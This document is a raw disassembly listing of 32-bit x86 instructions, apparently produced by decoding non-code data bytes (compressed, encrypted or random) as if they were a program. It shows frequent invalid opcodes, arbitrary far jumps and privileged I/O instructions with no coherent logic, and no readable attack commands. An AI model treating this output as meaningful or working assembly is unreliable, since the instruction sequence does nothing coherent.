  418b4e:	sti    
  418b4f:	daa    
  418b50:	xchg   ecx,eax
  418b51:	into   
  418b52:	or     DWORD PTR [eax+0x295ae74],0x71
  418b59:	jbe    0x418b23
  418b5b:	push   edx
  418b5c:	xor    eax,0x7c6d979f
  418b61:	push   edi
  418b62:	sub    edx,DWORD PTR [eax-0x10e8bec8]
  418b68:	jnp    0x418b79
  418b6a:	pop    es
  418b6b:	gs loope 0x418b2f
  418b6e:	mov    ds:0xc91a806c,eax
  418b73:	cmp    dh,BYTE PTR [edi]
  418b75:	inc    edi
  418b76:	mov    bl,0x83
  418b78:	sti    
  418b79:	and    al,0x93
  418b7b:	loop   0x418b43
  418b7d:	lahf   
  418b7e:	popf   
  418b7f:	and    eax,0x4a94f0a3
  418b84:	sbb    ch,al
  418b86:	dec    ebx
  418b87:	test   DWORD PTR [esi-0x50],ebx
  418b8a:	inc    ecx
  418b8b:	sbb    BYTE PTR [ecx+0x16],ah
  418b8e:	cs mov ecx,0x9696c596
  418b94:	push   ss
  418b95:	pop    esp
  418b96:	icebp  
  418b97:	adc    al,0xf9
  418b99:	adc    al,0x1f
  418b9b:	mov    edi,ss
  418b9d:	rol    DWORD PTR [ebx],cl
  418b9f:	aam    0x4f
  418ba1:	jmp    0x8f63:0x83465cf8
  418ba8:	ins    DWORD PTR es:[edi],dx
  418ba9:	fld    DWORD PTR [esi-0x4e]
  418bac:	cmp    al,0x73
  418bae:	mov    edx,0xf983f3a0
  418bb3:	jnp    0x418c1a
  418bb5:	sbb    al,0xbb
  418bb7:	dec    eax
  418bb8:	les    ebp,FWORD PTR [esi]
  418bba:	mov    edx,0xd051b41
  418bbf:	lea    esp,[ebp+0x13]
  418bc2:	in     eax,dx
  418bc3:	or     cl,BYTE PTR [esi]
  418bc5:	fcom   QWORD PTR [edx+0xbec24be]
  418bcb:	mov    bh,0x91
  418bcd:	in     eax,dx
  418bce:	dec    ebx
  418bcf:	mov    ecx,0x29e40257
  418bd4:	ret    
  418bd5:	cmp    eax,0x6f3f787c
  418bda:	add    eax,0xc8469f23
  418bdf:	scas   eax,DWORD PTR es:[edi]
  418be0:	fmul   DWORD PTR [ecx-0x5a]
  418be3:	push   ss
  418be4:	retf   
  418be5:	pop    ecx
  418be6:	scas   eax,DWORD PTR es:[edi]
  418be7:	fwait
  418be8:	cmp    esi,ebp
  418bea:	mov    WORD PTR [edi-0x56ab08e3],cs
  418bf0:	inc    esp
  418bf1:	jo     0x418bbc
  418bf3:	(bad)  
  418bf4:	sub    al,0xd0
  418bf6:	and    dl,dl
  418bf8:	mov    esi,DWORD PTR [edi-0x6]
  418bfb:	dec    ebp
  418bfc:	pop    ebx
  418bfd:	mov    edi,0x165a85d2
  418c02:	sbb    BYTE PTR [eax],bl
  418c04:	test   al,0xdb
  418c06:	push   0x6
  418c08:	xor    eax,0x58869d86
  418c0d:	gs jbe 0x418ba7
  418c10:	fcomp  DWORD PTR [edx-0x61]
  418c13:	push   esi
  418c14:	clc    
  418c15:	out    dx,al
  418c16:	fcom   QWORD PTR [edx]
  418c18:	and    eax,0x43c83968
  418c1d:	jecxz  0x418c23
  418c1f:	fiadd  WORD PTR [ecx+0x4986ca4]
  418c25:	scas   eax,DWORD PTR es:[edi]
  418c26:	sub    al,0x8f
  418c28:	ins    DWORD PTR es:[edi],dx
  418c29:	ret    0x4c3a
  418c2c:	jnp    0x418c1d
  418c2e:	sub    dh,BYTE PTR [ebp-0x660cf7dc]
  418c34:	stos   BYTE PTR es:[edi],al
  418c35:	(bad)  
  418c36:	scas   eax,DWORD PTR es:[edi]
  418c37:	in     al,0x9d
  418c39:	sub    eax,0x38af3451
  418c3e:	clc    
  418c3f:	mov    eax,0x7580e337
  418c44:	push   esp
  418c45:	out    0x9e,al
  418c47:	sar    DWORD PTR [ecx],cl
  418c49:	jae    0x418c0a
  418c4b:	sbb    al,0x2d
  418c4d:	jmp    0x438a:0x728447ba
  418c54:	in     eax,0xd6
  418c56:	pop    edx
  418c57:	adc    ch,BYTE PTR [esi+0x3b039713]
  418c5d:	shl    BYTE PTR [edi-0x2a],1
  418c60:	lods   eax,DWORD PTR ds:[esi]
  418c61:	xchg   edi,eax
  418c62:	mov    ebx,0x29d350f
  418c67:	xlat   BYTE PTR ds:[ebx]
  418c68:	cwde   
  418c69:	add    al,dl
  418c6b:	jmp    0x418c5c
  418c6d:	adc    edi,edi
  418c6f:	pop    esi
  418c70:	das    
  418c71:	pop    eax
  418c72:	jmp    0x121d:0x2a3c266f
  418c79:	push   ebx
  418c7a:	push   edx
  418c7b:	mov    ds:0xca541192,al
  418c80:	mov    cl,0xf7
  418c82:	ficom  WORD PTR [edi]
  418c84:	xlat   BYTE PTR ds:[ebx]
  418c85:	and    al,0x81
  418c87:	retf   
  418c88:	iret   
  418c89:	jne    0x418c80
  418c8b:	jecxz  0x418c3c
  418c8d:	mov    ds:0xf8c683ea,al
  418c92:	jmp    0x10e8440e
	...
  418d13:	add    bl,ah
  418d15:	pop    ds
  418d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d17:	adc    al,0xfe
  418d19:	mov    ebp,0x9faffff3
  418d1e:	test   ah,0xc6
  418d21:	mov    esp,0x2e72cf00
  418d26:	add    DWORD PTR [eax],eax
  418d28:	imul   eax,DWORD PTR [edi],0x0
  418d2b:	add    ah,ch
  418d2d:	push   ecx
  418d2e:	sahf   
  418d2f:	pop    ecx
  418d30:	repz lahf 
  418d32:	mov    eax,ds:0xd25b5b64
  418d37:	lahf   
  418d38:	aaa    
  418d39:	fcomp  DWORD PTR [ebx]
  418d3b:	hlt    
  418d3c:	add    dh,0xef
  418d3f:	test   BYTE PTR [ebx],dh
  418d41:	fidivr WORD PTR [edx+0x16b926c3]
  418d47:	call   0x1df0:0x8ce9f2fc
  418d4e:	jecxz  0x418d27
  418d50:	push   edi
  418d51:	jle    0x418d36
  418d53:	lea    edi,[ebx+0x5f]
  418d56:	push   0x4a48262b
  418d5b:	repnz pop ss
  418d5d:	or     DWORD PTR [esi+0x59],ecx
  418d60:	push   esi
  418d61:	mov    bh,0x35
  418d63:	(bad)  
  418d64:	stc    
  418d65:	mov    ecx,ebx
  418d67:	xor    DWORD PTR [edi+eiz*8+0x450a880e],edi
  418d6e:	(bad)  
  418d6f:	out    0xa4,al
  418d71:	pop    eax
  418d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d73:	(bad)  
  418d75:	dec    edi
  418d76:	sub    BYTE PTR [edi],al
  418d78:	add    al,0xc2
  418d7a:	mov    ah,0x66
  418d7c:	sbb    DWORD PTR [edx+edi*4+0x28],edx
  418d80:	fst    st(2)
  418d82:	fld    DWORD PTR [edi]
  418d84:	pop    ebx
  418d85:	adc    eax,0x80b2d6e9
  418d8a:	cmp    al,0x62
  418d8c:	or     esp,DWORD PTR [ecx+0x50ed21d6]
  418d92:	sub    eax,0x9180da91
  418d97:	pop    esi
  418d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d99:	mov    edi,ebp
  418d9b:	jae    0x418d74
  418d9d:	inc    esp
  418d9e:	mov    cl,0xe5
  418da0:	pop    edx
  418da1:	push   cs
  418da2:	retf   0x2b6a
  418da5:	pop    edi
  418da6:	aas    
  418da7:	out    0x47,eax
  418da9:	jnp    0x418dcc
  418dab:	icebp  
  418dac:	div    DWORD PTR [ecx-0x2c033178]
  418db2:	inc    ecx
  418db3:	inc    ecx
  418db4:	dec    ebx
  418db5:	in     al,0x45
  418db7:	bound  eax,QWORD PTR [eax]
  418db9:	xor    eax,0x1e295a87
  418dbe:	lds    ebx,FWORD PTR [edi-0x42]
  418dc1:	jne    0x418db1
  418dc3:	sub    BYTE PTR [edi],ch
  418dc5:	sub    BYTE PTR [ebx],0xd9
  418dc8:	fist   WORD PTR [edi-0x26f60850]
  418dce:	fbld   TBYTE PTR [ebx]
  418dd0:	xchg   BYTE PTR [edx],bh
  418dd2:	outs   dx,BYTE PTR ds:[esi]
  418dd3:	xor    edi,DWORD PTR [ecx-0x724d3c37]
  418dd9:	je     0x418dbb
  418ddb:	pop    es
  418ddc:	(bad)  
  418ddd:	mov    ds:0x573baf4,eax
  418de2:	cmp    BYTE PTR [edx+0x36],dh
  418de5:	pop    eax
  418de6:	mov    esi,0xd0195ab2
  418deb:	aam    0xa1
  418ded:	jnp    0x418e1e
  418def:	(bad)  
  418df0:	cmp    DWORD PTR [ecx+0x1dc07196],ebp
  418df6:	retf   
  418df7:	dec    esi
  418df8:	or     eax,0x77b5e6a2
  418dfd:	fdivr  st(7),st
  418dff:	add    eax,esp
  418e01:	imul   edx,DWORD PTR [edi-0x46],0x8f49fd31
  418e08:	pop    edx
  418e09:	ins    BYTE PTR es:[edi],dx
  418e0a:	cmp    dl,0xb
  418e0d:	adc    BYTE PTR [edi-0x6192baf1],dh
  418e13:	dec    ebp
  418e14:	mov    esp,0xe4d3cff9
  418e19:	out    dx,eax
  418e1a:	cdq    
  418e1b:	stos   BYTE PTR es:[edi],al
  418e1c:	(bad)  
  418e1d:	retf   0xad7e
  418e20:	inc    esp
  418e21:	xchg   edx,edx
  418e23:	ins    DWORD PTR es:[edi],dx
  418e24:	push   esp
  418e25:	or     ah,BYTE PTR [ecx-0x70]
  418e28:	aas    
  418e29:	pop    esi
  418e2a:	int    0x53
  418e2c:	xchg   DWORD PTR [ecx],esi
  418e2e:	faddp  st(7),st
  418e30:	out    dx,eax
  418e31:	adc    DWORD PTR [ebx+0x7a796481],edi
  418e37:	cmp    bl,BYTE PTR [edx-0x1d12ab11]
  418e3d:	xor    eax,0x2902a792
  418e42:	retf   
  418e43:	rcl    DWORD PTR ds:0xc57f57ce,cl
  418e49:	mov    eax,ds:0x3183ce3b
  418e4e:	sbb    edi,DWORD PTR [edi]
  418e50:	outs   dx,DWORD PTR ds:[esi]
  418e51:	inc    ebx
  418e52:	jecxz  0x418e9a
  418e54:	push   ecx
  418e55:	cmp    dh,BYTE PTR [ebx]
  418e57:	mov    esp,0xce53f1f
  418e5c:	lods   al,BYTE PTR ds:[esi]
  418e5d:	fcmovb st,st(3)
  418e5f:	mov    edx,0xf78df2ba
  418e64:	call   0x7aac:0xb12cd9b
  418e6b:	in     al,0x96
  418e6d:	mov    al,ds:0xc685630
  418e72:	inc    edi
  418e73:	stos   DWORD PTR es:[edi],eax
  418e74:	sbb    eax,DWORD PTR [edi-0x170c2c87]
  418e7a:	in     al,0x83
  418e7c:	push   0x25b87670
  418e81:	js     0x418e69
  418e83:	mov    ds:0x268c9ab5,al
  418e88:	mov    es:0x44884696,al
  418e8e:	lea    edi,[ebp+0x9]
  418e91:	or     esp,DWORD PTR [ecx+eax*4]
  418e94:	test   al,0x5c
  418e96:	scas   eax,DWORD PTR es:[edi]
  418e97:	push   0xffffffb0
  418e99:	cld    
  418e9a:	mov    cl,0xde
  418e9c:	arpl   WORD PTR [ecx-0x5d5705ce],di
  418ea2:	pusha  
  418ea3:	clc    
  418ea4:	(bad)  
  418ea5:	dec    edx
  418ea6:	nop
  418ea7:	jle    0x418ee5
  418ea9:	out    dx,eax
  418eaa:	fldenv [eax+0x39]
  418ead:	aad    0xac
  418eaf:	inc    ebp
  418eb0:	test   DWORD PTR [ebx-0x42],edx
  418eb3:	pop    edi
  418eb4:	inc    esp
  418eb5:	xchg   ecx,eax
  418eb6:	mov    gs,ebx
  418eb8:	dec    ecx
  418eb9:	sbb    esp,0x689c237
  418ebf:	cmp    al,0x59
  418ec1:	loop   0x418e83
  418ec3:	ss inc edx
  418ec5:	sahf   
  418ec6:	inc    esi
  418ec7:	jp     0x418ee6
  418ec9:	push   eax
  418eca:	adc    bl,BYTE PTR [edi+ebp*8+0x2a]
  418ece:	xchg   ebx,eax
  418ecf:	test   al,0x82
  418ed1:	or     eax,0xdb6a92a1
  418ed6:	into   
  418ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed8:	ds leave 
  418eda:	mov    ?,WORD PTR [eax-0x4d9b381c]
  418ee0:	dec    ebx
  418ee1:	mov    eax,0x63191c63
  418ee6:	es repz cdq 
  418ee9:	push   esp
  418eea:	sti    
  418eeb:	popf   
  418eec:	in     al,0x66
  418eee:	in     al,dx
  418eef:	inc    ebp
  418ef0:	stc    
  418ef1:	leave  
  418ef2:	and    al,0xa4
  418ef4:	inc    eax
  418ef5:	mov    ch,0x12
  418ef7:	sbb    DWORD PTR [eax],0x16248487
  418efd:	std    
  418efe:	add    edx,DWORD PTR [ebx]
  418f00:	clc    
  418f01:	sbb    ebp,DWORD PTR [ebx]
  418f03:	xchg   edx,eax
  418f04:	(bad)  
  418f05:	addr16 pop esp
  418f07:	shl    DWORD PTR [ebp-0x9],1
  418f0a:	je     0x418f0b
  418f0c:	or     DWORD PTR [eax+0x73],esp
  418f0f:	(bad)
  418f13:	xchg   DWORD PTR [ecx-0x19838ac8],ecx
  418f19:	mov    dh,BYTE PTR [edi]
  418f1b:	add    DWORD PTR [ebx+edi*1-0x3b],ecx
  418f1f:	adc    eax,0x371e96fe
  418f24:	iret   
  418f25:	mov    ds:0x710c787c,al
  418f2a:	inc    edi
  418f2b:	pop    edx
  418f2c:	lahf   
  418f2d:	rol    DWORD PTR ds:0x338b0beb,cl
  418f33:	loop   0x418f8e
  418f35:	aad    0x96
  418f37:	je     0x418f5a
  418f39:	cmp    DWORD PTR ds:0x784cadbf,ebx
  418f3f:	fcomip st,st(2)
  418f41:	push   esi
  418f42:	mov    WORD PTR [ebp-0x6d271fa2],?
  418f48:	popa   
  418f49:	ret    0x8381
  418f4c:	pminsw mm3,QWORD PTR [esi+0xa]
  418f50:	push   esp
  418f51:	cmp    bl,al
  418f53:	or     BYTE PTR [ebx-0x512727ec],bl
  418f59:	fucomp st(0)
  418f5b:	xchg   al,bh
  418f5d:	hlt    
  418f5e:	sub    DWORD PTR [ebp-0x52],edi
  418f61:	jbe    0x418f8c
  418f63:	mov    cl,0x2b
  418f65:	dec    esi
  418f66:	in     al,0x14
  418f68:	jecxz  0x418fc2
  418f6a:	jecxz  0x418fc9
  418f6c:	icebp  
  418f6d:	dec    ecx
  418f6e:	mov    bl,0xbe
  418f70:	push   es
  418f71:	cmp    ebx,DWORD PTR es:[eax]
  418f74:	adc    esp,DWORD PTR [ebp+ebp*4-0x71]
  418f78:	jl     0x418f96
  418f7a:	dec    edx
  418f7b:	xchg   ebx,eax
  418f7c:	stos   DWORD PTR es:[edi],eax
  418f7d:	adc    eax,0x1d00ec01
  418f82:	xchg   ecx,eax
  418f83:	call   0x70df:0xda40c062
  418f8a:	ins    BYTE PTR es:[edi],dx
  418f8b:	ret    0x2e76
  418f8e:	jmp    0xc854485c
  418f93:	enter  0xed80,0xc3
  418f97:	inc    ebp
  418f98:	fdivr  QWORD PTR [esi+0x76efc1b6]
  418f9e:	imul   ecx,DWORD PTR [eax+0x31],0xffffffb2
  418fa2:	fwait
  418fa3:	xlat   BYTE PTR ds:[ebx]
  418fa4:	jno    0x418ffe
  418fa6:	dec    esi
  418fa7:	sahf   
  418fa8:	or     ch,ch
  418faa:	mov    edi,DWORD PTR [edi-0x43]
  418fad:	fiadd  DWORD PTR [eax-0x33a02c2e]
  418fb3:	ret    
  418fb4:	add    ah,dh
  418fb6:	sbb    cl,BYTE PTR ds:0xf69d1a5e
  418fbc:	dec    edi
  418fbd:	arpl   WORD PTR [ebx+0x65],bp
  418fc0:	jbe    0x418ffe
  418fc2:	xchg   esp,eax
  418fc3:	cmp    DWORD PTR [esi+0x3f9dcf9],0xb8423070
  418fcd:	cmp    bh,cl
  418fcf:	push   es
  418fd0:	(bad)  
  418fd2:	cmp    BYTE PTR [edx],dl
  418fd4:	repz add BYTE PTR [ebp-0x6f1eb47a],0x38
  418fdc:	dec    esp
  418fdd:	mov    BYTE PTR [ecx-0x3c],dh
  418fe0:	nop
  418fe1:	iret   
  418fe2:	inc    edx
  418fe3:	popf   
  418fe4:	mov    edx,0xbb99b50a
  418fe9:	arpl   WORD PTR [eax],bp
  418feb:	mov    edx,0x92570a95
  418ff0:	push   eax
  418ff1:	ret    
  418ff2:	mov    eax,0x1f833d92
  418ff7:	dec    ecx
  418ff8:	adc    bh,cl
  418ffa:	xchg   ecx,eax
  418ffb:	or     DWORD PTR [ecx+esi*2-0xed583cf],0xb990166f
  419006:	inc    eax
  419007:	mov    ebp,0x6d2ce562
  41900c:	xor    al,dh
  41900e:	dec    esp
  41900f:	outs   dx,BYTE PTR ds:[esi]
  419010:	xor    eax,0x661c66af
  419015:	sbb    ecx,DWORD PTR [edx]
  419017:	sbb    ecx,edi
  419019:	dec    ebp
  41901a:	sahf   
  41901b:	xchg   BYTE PTR [eax],ch
  41901d:	mov    bl,0xeb
  41901f:	in     eax,0xc4
  419021:	das    
  419022:	inc    ebp
  419023:	ret    0xa2c9
  419026:	dec    edi
  419027:	sbb    al,bl
  419029:	lods   al,BYTE PTR ds:[esi]
  41902a:	jl     0x41906b
  41902c:	cmp    eax,DWORD PTR [esi]
  41902e:	mov    ds:0x64bf30a7,al
  419033:	fucom  st(7)
  419035:	mov    esp,0xe50c5223
  41903a:	push   ss
  41903b:	shl    ecx,1
  41903d:	sbb    cl,BYTE PTR [edi]
  41903f:	cdq    
  419040:	loope  0x4190ad
  419042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419043:	and    bl,BYTE PTR [ecx+0x4e]
  419046:	sbb    eax,0x7c301a05
  41904b:	adc    eax,0x6f42689
  419050:	pop    es
  419051:	dec    ebx
  419052:	mov    edi,ebx
  419054:	xor    eax,0x4a7cc28e
  419059:	sar    BYTE PTR [edi],0x1f
  41905c:	inc    esi
  41905d:	ret    0xe8dd
  419060:	adc    al,0x69
  419062:	sub    edi,ebx
  419064:	mov    al,0x89
  419066:	in     al,0x56
  419068:	popf   
  419069:	jg     0x4190e8
  41906b:	outs   dx,BYTE PTR ds:[esi]
  41906c:	inc    esi
  41906d:	jmp    0xd2af:0x914b907e
  419074:	loopne 0x4190d6
  419076:	sbb    BYTE PTR [ecx-0x490786d4],bl
  41907c:	mov    esi,0x64628bdf
  419081:	aaa    
  419082:	rol    DWORD PTR [ecx+eiz*8-0x2afa8c80],0x31
  41908a:	aad    0xed
  41908c:	loopne 0x41909f
  41908e:	dec    ecx
  41908f:	repnz mov BYTE PTR [ebx],cl
  419092:	xor    al,0x6a
  419094:	cli    
  419095:	mov    al,0xc9
  419097:	popf   
  419098:	sbb    al,0xd0
  41909a:	les    eax,FWORD PTR [edx-0x74afdc7a]
  4190a0:	leave  
  4190a1:	pop    ds
  4190a2:	inc    edi
  4190a3:	jbe    0x419069
  4190a5:	dec    edx
  4190a6:	out    dx,al
  4190a7:	pop    ebp
  4190a8:	cld    
  4190a9:	sub    bl,bh
  4190ab:	adc    bl,bh
  4190ad:	jmp    0x41908e
  4190af:	pusha  
  4190b0:	inc    esi
  4190b1:	push   eax
  4190b2:	icebp  
  4190b3:	ins    DWORD PTR es:[edi],dx
  4190b4:	or     DWORD PTR [ecx],ebx
  4190b6:	mov    eax,ds:0xf0334e8e
  4190bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190bc:	mov    al,ds:0xc65ad533
  4190c1:	ficomp WORD PTR ds:0x69538a14
  4190c7:	pop    ax
  4190c9:	or     ecx,DWORD PTR [ebx-0x44aae5a6]
  4190cf:	jae    0x419112
  4190d1:	dec    ebx
  4190d2:	stc    
  4190d3:	and    DWORD PTR ds:0xbf0d6760,ebp
  4190d9:	mov    ebx,0xaa21c48
  4190de:	lods   eax,DWORD PTR ds:[esi]
  4190df:	das    
  4190e0:	stos   DWORD PTR es:[edi],eax
  4190e1:	or     eax,0x4dd11ad9
  4190e6:	sub    edx,DWORD PTR [edi+0x2e67e69f]
  4190ec:	xchg   edx,edx
  4190ee:	add    esi,DWORD PTR [edx]
  4190f0:	mov    al,ds:0xd5a8008d
  4190f5:	dec    edx
  4190f6:	mov    BYTE PTR [ebx+0x7b],ah
  4190f9:	lock jmp 0x419116
  4190fc:	(bad)  
  4190fd:	mul    BYTE PTR [ebx]
  4190ff:	gs push 0xc0b47395
  419105:	push   edx
  419106:	retf   
  419107:	mov    esp,0xb6ef28e4
  41910c:	pop    ebx
  41910d:	cmp    cl,al
  41910f:	cmp    eax,0xe848656f
  419114:	clc    
  419115:	dec    eax
  419116:	xor    al,0x39
  419118:	lods   eax,DWORD PTR ds:[esi]
  419119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41911a:	jmp    0x4190a3
  41911c:	mov    eax,ds:0xbb150bb8
  419121:	loop   0x4190ca
  419123:	xchg   edx,eax
  419124:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419125:	pop    esi
  419126:	add    bl,BYTE PTR [ebx]
  419128:	cmp    edx,DWORD PTR [ecx+0x316ebec1]
  41912e:	xor    esi,eax
  419130:	mov    al,0x8d
  419132:	test   DWORD PTR [ebp-0x4d80e047],0x180e21df
  41913c:	xchg   esi,eax
  41913d:	loop   0x4190c8
  41913f:	jno    0x4191ba
  419141:	fadd   QWORD PTR [edi]
  419143:	popf   
  419144:	cld    
  419145:	pushf  
  419146:	test   al,dh
  419148:	fimul  WORD PTR [edi-0x76]
  41914b:	adc    DWORD PTR [ecx],esp
  41914d:	shr    BYTE PTR [ebx+0xf],cl
  419150:	nop
  419151:	push   ds
  419152:	or     bh,BYTE PTR [eax]
  419154:	mov    esp,0xcab404f3
  419159:	jp     0x4190f0
  41915b:	lea    ebp,[edx-0x71f0f22c]
  419161:	mov    bh,0xc0
  419163:	cwde   
  419164:	mov    bh,ch
  419166:	mov    ?,WORD PTR [di+0x41]
  41916a:	and    ah,BYTE PTR [ecx+0x1d]
  41916d:	inc    ebx
  41916e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41916f:	dec    ecx
  419170:	inc    esp
  419171:	adc    dl,BYTE PTR [esi+0x2]
  419174:	loop   0x4191b9
  419176:	jno    0x4190fb
  419178:	sbb    eax,0xf8f28512
  41917d:	mov    bl,0x54
  41917f:	outs   dx,BYTE PTR ds:[esi]
  419180:	cmp    eax,DWORD PTR [ebx-0x5c]
  419183:	xor    eax,0x2f550503
  419188:	mov    ch,0xf8
  41918a:	dec    ebp
  41918b:	or     eax,0x67c478da
  419190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419191:	test   DWORD PTR [ebp-0x612dcd68],ebx
  419197:	std    
  419198:	pop    ebx
  419199:	sub    dl,BYTE PTR [edi*4-0x4dbb45ba]
  4191a0:	xor    DWORD PTR [edi+0x3cecd3fd],0x62
  4191a7:	outs   dx,DWORD PTR ds:[esi]
  4191a8:	xchg   edx,eax
  4191a9:	sbb    eax,0x6f6459e4
  4191ae:	and    edi,DWORD PTR ds:0x4f281df7
  4191b4:	test   al,0x84
  4191b6:	cli    
  4191b7:	clc    
  4191b8:	jno    0x4191f1
  4191ba:	rol    bl,1
  4191bc:	repz mov edx,0xdecdf8c
  4191c2:	add    DWORD PTR [ebp+0x5dd6f1d4],ecx
  4191c8:	ja     0x41917f
  4191ca:	xor    eax,0x99b48b09
  4191cf:	inc    eax
  4191d0:	aas    
  4191d1:	adc    BYTE PTR [esi],cl
  4191d3:	sbb    BYTE PTR [eax],ah
  4191d5:	mov    esp,0x129ef320
  4191da:	mov    ebx,DWORD PTR ds:0xf92f74e6
  4191e0:	shl    DWORD PTR [ecx],0xee
  4191e3:	lods   eax,DWORD PTR ds:[esi]
  4191e4:	nop
  4191e5:	sbb    ah,BYTE PTR [ebp-0x1949d645]
  4191eb:	jp     0x4191f5
  4191ed:	add    edx,DWORD PTR es:[eax-0x5362281c]
  4191f4:	imul   ebx,DWORD PTR [edi+0x12d4ce5e],0xd2607170
  4191fe:	es cmp al,0xcc
  419201:	int    0x83
  419203:	scas   al,BYTE PTR es:[edi]
  419204:	xchg   esp,eax
  419205:	dec    eax
  419206:	pop    ds
  419207:	mov    esi,0x5b51c48f
  41920c:	(bad)  
  41920d:	mov    dh,0xd2
  41920f:	dec    esp
  419210:	aaa    
  419211:	icebp  
  419212:	xor    bh,BYTE PTR [ecx-0x240c99be]
  419218:	cmp    dl,BYTE PTR [ecx]
  41921a:	int3   
  41921b:	shl    DWORD PTR [esi-0x2b],cl
  41921e:	in     eax,dx
  41921f:	std    
  419220:	jmp    0x419234
  419222:	mov    ch,0x44
  419224:	js     0x419229
  419226:	ins    DWORD PTR es:[edi],dx
  419227:	and    DWORD PTR [esi+0x63],edx
  41922a:	mov    bl,0x40
  41922c:	dec    ecx
  41922d:	jmp    0x2d7d:0xe36e6e36
  419234:	rcl    BYTE PTR [ebx+0x16c150e8],1
  41923a:	or     eax,0x81b3997a
  41923f:	bound  ebp,QWORD PTR [esi-0x6d]
  419242:	dec    edx
  419243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419244:	mul    DWORD PTR [esi+0x5ea0ac53]
  41924a:	sbb    BYTE PTR [edi-0x76],bh
  41924d:	dec    esi
  41924e:	rol    esp,1
  419250:	dec    ebx
  419251:	pop    esi
  419252:	js     0x4192b2
  419254:	pushf  
  419255:	push   ebp
  419256:	scas   al,BYTE PTR es:[edi]
  419257:	ja     0x4192be
  419259:	inc    ebx
  41925a:	pop    eax
  41925b:	pop    eax
  41925c:	sub    eax,0x9c5e071e
  419261:	stos   DWORD PTR es:[edi],eax
  419262:	lods   al,BYTE PTR ds:[esi]
  419263:	or     DWORD PTR [ebp+0x7803bf63],ebp
  419269:	mov    ah,bh
  41926b:	adc    bl,al
  41926d:	pop    esi
  41926e:	ja     0x41925f
  419270:	stc    
  419271:	inc    esi
  419272:	xchg   BYTE PTR [esi+0x37],bl
  419275:	pushf  
  419276:	xor    eax,0x233367ed
  41927b:	lahf   
  41927c:	mov    edx,0x1ba753f6
  419281:	shl    edi,1
  419283:	sub    eax,0x583532c2
  419288:	add    ch,bl
  41928a:	mov    esp,0x15c59dc4
  41928f:	and    esi,edx
  419291:	arpl   WORD PTR [esi*8-0x45bfec51],sp
  419298:	push   es
  419299:	imul   edi,DWORD PTR [ebp-0x3e729b37],0x1537ef11
  4192a3:	sbb    eax,0x9a989930
  4192a8:	lahf   
  4192a9:	xor    BYTE PTR [eax+edx*1-0x4727d4cf],cl
  4192b0:	mov    dl,0xed
  4192b2:	push   0xa61fa691
  4192b7:	xchg   esp,eax
  4192b8:	pop    es
  4192b9:	loope  0x419278
  4192bb:	jb     0x41926f
  4192bd:	(bad)  
  4192be:	mov    fs,WORD PTR [ebx-0x46fbe743]
  4192c4:	in     al,0xa1
  4192c6:	adc    BYTE PTR [edi-0x667e063d],0xa7
  4192cd:	xor    eax,0x9705ffb7
  4192d2:	pop    edx
  4192d3:	dec    eax
  4192d4:	and    BYTE PTR [ecx-0x379c7311],dl
  4192da:	fstp   DWORD PTR [esi+0x339af6df]
  4192e0:	mov    al,0x1
  4192e2:	xchg   edx,eax
  4192e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192e4:	jge    0x419334
  4192e6:	pop    edi
  4192e7:	xor    dh,dh
  4192e9:	pop    edx
  4192ea:	sti    
  4192eb:	in     al,dx
  4192ec:	push   ss
  4192ed:	test   BYTE PTR [edx+0x53cc64ff],cl
  4192f3:	mov    BYTE PTR [esi],bl
  4192f5:	inc    ecx
  4192f6:	pop    ebx
  4192f7:	inc    ebp
  4192f8:	lods   al,BYTE PTR ds:[esi]
  4192f9:	fidivr WORD PTR [eax]
  4192fb:	mov    ds:0x7b66fb60,eax
  419300:	add    BYTE PTR [ebp+0x25ffe90],dl
  419306:	adc    esi,DWORD PTR [ebx-0x482cbfa5]
  41930c:	arpl   WORD PTR [ecx+0x1e517698],dx
  419312:	jne    0x419373
  419314:	jmp    0x4192b7
  419316:	inc    esi
  419317:	pop    es
  419318:	inc    ecx
  419319:	push   ss
  41931a:	jl     0x4192f0
  41931c:	push   esi
  41931d:	jmp    0x419389
  41931f:	add    BYTE PTR [edx+0x40857691],dl
  419325:	ss xor ah,ch
  419328:	mov    ah,0xa6
  41932a:	in     eax,0x8a
  41932c:	sub    eax,0x378d29ad
  419331:	scas   eax,DWORD PTR es:[edi]
  419332:	xchg   esi,eax
  419333:	dec    ebp
  419334:	push   ebp
  419335:	xchg   DWORD PTR [ecx],ecx
  419337:	inc    edi
  419338:	pop    ds
  419339:	repz (bad) 
  41933b:	(bad)  
  41933d:	lahf   
  41933e:	cli    
  41933f:	cwde   
  419340:	(bad)
  419344:	sti    
  419345:	push   esi
  419346:	and    ebx,DWORD PTR [ebp-0x13d88923]
  41934c:	mov    dl,0x50
  41934e:	ret    0xe2c2
  419351:	xor    esp,eax
  419353:	jle    0x4193bd
  419355:	inc    ebp
  419356:	lea    ebp,[ecx+esi*8]
  419359:	push   0x53
  41935b:	sti    
  41935c:	or     DWORD PTR [eax+0x7a56ee38],edx
  419362:	add    DWORD PTR ds:0x37aa4148,eax
  419368:	jno    0x4193e8
  41936a:	mov    ds:0x3e0f27ba,eax
  41936f:	fld    st(2)
  419371:	(bad)  
  419372:	clc    
  419373:	retf   0x3768
  419376:	sbb    dh,BYTE PTR [edi-0x9]
  419379:	pop    ebx
  41937a:	arpl   ax,si
  41937c:	add    BYTE PTR [esi],0x40
  41937f:	inc    esp
  419380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419381:	cmp    DWORD PTR [ebx],esi
  419383:	and    BYTE PTR [ebx],dh
  419385:	xor    esi,ebx
  419387:	out    dx,eax
  419388:	push   eax
  419389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41938a:	iret   
  41938b:	dec    ecx
  41938c:	test   BYTE PTR [edx-0x29691a70],0x63
  419393:	stos   DWORD PTR es:[edi],eax
